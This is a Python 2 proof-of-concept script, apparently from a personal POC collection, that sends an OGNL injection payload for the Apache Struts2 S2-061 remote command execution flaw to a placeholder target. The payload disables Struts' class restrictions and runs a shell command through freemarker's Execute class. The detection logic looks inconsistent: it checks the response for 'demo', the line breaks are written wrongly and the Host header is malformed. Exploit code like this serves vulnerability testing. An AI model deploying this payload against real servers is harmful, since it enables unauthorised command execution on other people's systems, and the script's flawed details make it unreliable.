# coding:utf-8
# python2

'''
@Project    : POC
@File       : Apache Struts2.py
@Author     : LiC
@Date       : 2021/8/6 20:09
'''


import requests

address = 'xxx:8080'

if "http" not in address:
    address="http://"+address
else:
    address=address

def S2_061():
    headers = {
        'Host: ': address + ':8080',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
        'Content-Length': '846'
    }
    payload = '''------WebKitFormBoundaryl7d1B1aGsV2wcZwF/r/nContent-Disposition: form-data; name="id"/r/n%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("echo md5(333)")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}/r/n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--'''

    result = requests.post(address,payload,headers)

    if result.status_code == 200 and 'demo' in result.text:
        print address + " : Struts2 S2-061 远程命令执行漏洞"

S2_061()
